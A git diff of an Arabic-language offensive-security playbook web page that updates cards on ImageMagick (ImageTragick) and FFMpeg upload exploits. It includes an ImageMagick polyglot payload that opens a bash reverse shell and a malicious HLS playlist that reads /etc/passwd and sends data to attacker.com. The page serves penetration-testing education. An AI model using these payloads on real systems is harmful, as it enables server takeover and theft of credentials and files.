@@ -6,8 +6,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Offensive Security Playbook & Methodology | Abdo Ramdan</title>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/style.css?v=15">
-  <link rel="stylesheet" href="css/methodology.css?v=15">
+  <link rel="stylesheet" href="css/style.css?v=16">
+  <link rel="stylesheet" href="css/methodology.css?v=16">
 
   
 
@@ -3225,9 +3225,9 @@ Content-Type: application/json
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3 style="color:#ff0055;">📸 ImageMagick & FFMpeg Exploitation</h3></div>
-          <p>الكثير من المواقع تسمح برفع صورة شخصية أو فيديو وتقوم بتغيير حجمه (Resize) أو اقتصاصه (Crop) في الخلفية باستخدام برامج مثل <strong>ImageMagick</strong> أو <strong>FFMpeg</strong>.</p>
-          <p>إذا كان الموقع يستخدم إصداراً قديماً، يمكنك تضمين كود برمجي خبيث داخل خصائص الصورة (Exif Data) أو عبر استغلال ثغرة (ImageTragick CVE-2016-3714). بمجرد أن يفتح السيرفر الصورة لتعديل حجمها، يتم تنفيذ الكود واختراق السيرفر!</p>
+          <div class="card-header"><h3 style="color:#ff0055;">📸 ImageMagick (ImageTragick & Ghostscript Bypasses)</h3></div>
+          <p>الكثير من المواقع تسمح برفع صورة شخصية وتقوم بتغيير حجمها (Resize) في الخلفية باستخدام <strong>ImageMagick</strong>.</p>
+          <p>إذا كان الموقع يستخدم إصداراً قديماً (مثل ثغرة ImageTragick CVE-2016-3714)، يمكنك تضمين كود برمجي خبيث داخل خصائص الصورة. بمجرد أن يفتح السيرفر الصورة لتعديل حجمها، يتم تنفيذ الكود!</p>
           
           <h4 style="margin-top:15px; color:#ffaa00;">Polyglot Payload (صورة ملغمة بكود RCE):</h4>
           <div class="cmd-ui-box">
@@ -3236,7 +3236,28 @@ viewbox 0 0 640 480
 fill 'url(https://attacker.com/image.jpg"|bash -i >& /dev/tcp/10.10.14.5/4444 0>&1")'
 pop graphic-context</div>
           </div>
-          <p style="margin-top:10px; color:var(--text-secondary);">هذا الملف يتم حفظه بصيغة <code>.jpg</code> أو <code>.png</code>. بمجرد رفعه للموقع للـ Profile Picture، السيرفر سيتم تدميره والحصول على صلاحيات Root!</p>
+          <p style="margin-top:10px; color:var(--text-secondary);">هذا الملف يتم حفظه بصيغة <code>.jpg</code> أو <code>.png</code>. بمجرد رفعه للموقع، السيرفر سيتم تدميره والحصول على صلاحيات Root!</p>
+          
+          <h4 style="margin-top:15px; color:#00ff66;">Ghostscript Format String Bypass:</h4>
+          <p style="font-size:0.9rem; color:var(--text-secondary);">حتى لو تم ترقيع ImageTragick، الهاكرز المتقدمون يستخدمون صيغ (EPS/PDF) لاختراق مكتبة <code>Ghostscript</code> المدمجة داخل ImageMagick، مما يسمح بقراءة ملفات السيرفر أو تنفيذ أوامر (CVE-2018-16509).</p>
+        </div>
+
+        <div class="cyber-card border-neon" style="border-color:#9b59ff;">
+          <div class="card-header"><h3 style="color:#9b59ff;">🎥 FFMpeg HLS SSRF & Local File Read (Zero-Click)</h3></div>
+          <p>منصات الفيديو (مثل TikTok أو YouTube أو أي منصة تقبل رفع فيديو) تستخدم <strong>FFMpeg</strong> لقص الفيديو أو تحويل صيغته.</p>
+          <p>الهاكرز يقومون بصناعة فيديو خبيث بصيغة <code>.avi</code> يحوي داخله ملف <code>.m3u8 (HLS Playlist)</code>. عندما يحاول السيرفر قراءة الفيديو لاستخراج الفريمات، يقوم الـ FFMpeg بالخطأ بقراءة ملفات السيرفر الداخلية (مثل <code>/etc/passwd</code> أو <code>AWS Keys</code>) ويقوم بدمجها <strong>داخل الفيديو نفسه!</strong></p>
+          <p>بعدها يقوم الهاكر بتحميل الفيديو الخاص به بعد المعالجة، ليجد ملفات السيرفر السرية مطبوعة كـ (Subtitles) أو بيانات مدمجة في الفيديو!</p>
+          
+          <div class="cmd-ui-box" style="border-color:#9b59ff;">
+            <div class="cmd-ui-top" style="color:#e2caff;">
+# Malicious HLS Playlist embedded in video
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:http://attacker.com/ssrf?data=
+#EXTINF:1.0,
+file:///etc/passwd</div>
+          </div>
         </div>
 
         <button class="mark-complete-btn" onclick="markPhaseComplete('p_zeroclick','complete')">
